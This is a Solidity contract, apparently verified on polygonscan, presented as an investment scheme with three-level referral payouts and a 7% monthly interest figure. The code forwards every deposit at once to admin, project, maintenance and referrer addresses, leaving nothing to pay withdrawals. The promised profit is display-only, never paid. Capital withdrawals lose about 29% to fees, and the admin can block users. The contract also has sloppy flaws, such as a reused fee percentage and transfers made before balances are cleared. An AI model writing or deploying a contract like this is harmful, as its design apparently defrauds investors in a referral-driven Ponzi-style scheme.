/**
 *Submitted for verification at polygonscan.com on 2023-07-09
*/

pragma solidity 0.8.18;

contract InvestmentContract {
    address public adminAddr;
    address public projectAddr;
    address public maintenanceAddr;
    address public developer;
    
    uint public referralLevel1Percent = 7;
    uint public referralLevel2Percent = 3;
    uint public referralLevel3Percent = 1;
    uint public monthlyInterestPercent = 7;
    uint public adminFeePercent = 5;
    uint public capitalWithdrawalFeePercent = 15;
    
    mapping(address => uint) public balances;
    mapping(address => uint) public referralEarned;
    mapping(address => uint) public totalInvestments;
    mapping(address => uint) public totalWithdrawals;
    mapping(address => bool) public blockedUsers;
    mapping(address => address) public userReferral;
    
    event Invested(address indexed investor, address indexed referrer, uint amount);
    event Withdrawn(address indexed investor, uint amount);
    event CapitalWithdrawn(address indexed investor, uint amount);
    event MonthlyPercentSet(uint newPercent);
    event UserBlocked(address indexed user);
    event UserUnblocked(address indexed user);
    event AdminDeposited(uint amount);
    
    constructor(address _adminAddr, address _projectAddr, address _maintenanceAddr, address _developer) {
        adminAddr = _adminAddr;
        projectAddr = _projectAddr;
        maintenanceAddr = _maintenanceAddr;
        developer = _developer;
    }
    
    function invest(address referrer) external payable {
        require(msg.value >= 0.01 ether, "Minimum investment amount is 0.01 ether");
        require(!blockedUsers[msg.sender], "User is blocked");
        
        if (userReferral[msg.sender] == address(0)) {
            require(msg.sender != referrer, "Cannot set self as upline partner");
            userReferral[msg.sender] = referrer;
        }
        
        uint referralAmount = calculateReferralAmount(msg.value, userReferral[msg.sender]);
        
        balances[msg.sender] += msg.value;
        totalInvestments[msg.sender] += msg.value;
        
        emit Invested(msg.sender, userReferral[msg.sender], msg.value);
        
        uint adminFee = (msg.value * adminFeePercent) / 100;
        uint maintenanceFee = (msg.value * adminFeePercent) / 100;
        uint projectFee = msg.value - referralAmount - adminFee - maintenanceFee;
        
        payable(adminAddr).transfer(adminFee);
        payable(maintenanceAddr).transfer(maintenanceFee);
        payable(projectAddr).transfer(projectFee);
        
        if (userReferral[msg.sender] != address(0)) {
            payable(userReferral[msg.sender]).transfer(referralAmount);
            referralEarned[userReferral[msg.sender]] += referralAmount;
        }
    }
    
    function calculateReferralAmount(uint investmentAmount, address referrer) private view returns (uint) {
        uint referralAmount = 0;
        
        if (referrer != address(0)) {
            uint level1ReferralAmount = (investmentAmount * referralLevel1Percent) / 100;
            referralAmount += level1ReferralAmount;
            
            address referrerLevel2 = userReferral[referrer];
            if (referrerLevel2 != address(0)) {
                uint level2ReferralAmount = (investmentAmount * referralLevel2Percent) / 100;
                referralAmount += level2ReferralAmount;
                
                address referrerLevel3 = userReferral[referrerLevel2];
                if (referrerLevel3 != address(0)) {
                    uint level3ReferralAmount = (investmentAmount * referralLevel3Percent) / 100;
                    referralAmount += level3ReferralAmount;
                }
            }
        }
        
        return referralAmount;
    }
    
    function withdraw() external {
        require(balances[msg.sender] > 0, "No funds available for withdrawal");
        
        uint withdrawalAmount = balances[msg.sender];
        uint adminFee = (withdrawalAmount * adminFeePercent) / 100;
        uint finalWithdrawalAmount = withdrawalAmount - adminFee;
        
        payable(msg.sender).transfer(finalWithdrawalAmount);
        payable(adminAddr).transfer(adminFee);
        
        balances[msg.sender] = 0;
        totalWithdrawals[msg.sender] += withdrawalAmount;
        
        emit Withdrawn(msg.sender, finalWithdrawalAmount);
    }
    
    function capitalWithdraw() external {
        require(balances[msg.sender] > 0, "No funds available for withdrawal");
        
        uint withdrawalAmount = balances[msg.sender];
        uint adminFee = (withdrawalAmount * capitalWithdrawalFeePercent) / 100;
        uint projectFee = (withdrawalAmount * (capitalWithdrawalFeePercent - 1)) / 100;
        uint finalWithdrawalAmount = withdrawalAmount - adminFee - projectFee;
        
        payable(msg.sender).transfer(finalWithdrawalAmount);
        payable(adminAddr).transfer(adminFee);
        payable(projectAddr).transfer(projectFee);
        
        balances[msg.sender] = 0;
        totalWithdrawals[msg.sender] += withdrawalAmount;
        
        emit CapitalWithdrawn(msg.sender, finalWithdrawalAmount);
    }
    
    function setMonthlyPercent(uint newPercent) external {
        require(msg.sender == adminAddr, "Only admin can set the monthly percent");
        monthlyInterestPercent = newPercent;
        
        emit MonthlyPercentSet(newPercent);
    }
    
    function blockUser(address user) external {
        require(msg.sender == adminAddr, "Only admin can block users");
        blockedUsers[user] = true;
        
        emit UserBlocked(user);
    }
    
    function unblockUser(address user) external {
        require(msg.sender == adminAddr, "Only admin can unblock users");
        blockedUsers[user] = false;
        
        emit UserUnblocked(user);
    }
    
    function getUserBalanceAndProfit(address user) external view returns (uint balance, uint profit) {
        balance = balances[user];
        profit = (balance * monthlyInterestPercent) / 100;
    }
    
    function getReferralEarnings(address user) external view returns (uint earnings) {
        earnings = referralEarned[user];
    }
    
    function getTotalInvestments(address user) external view returns (uint investments) {
        investments = totalInvestments[user];
    }
    
    function getTotalDepositsAndWithdrawals(address user) external view returns (uint deposits, uint withdrawals) {
        deposits = totalInvestments[user];
        withdrawals = totalWithdrawals[user];
    }
    
    function adminDeposit() external payable {
        emit AdminDeposited(msg.value);
    }
    
    function getReferralAddress() external view returns (address) {
        return userReferral[msg.sender];
    }
}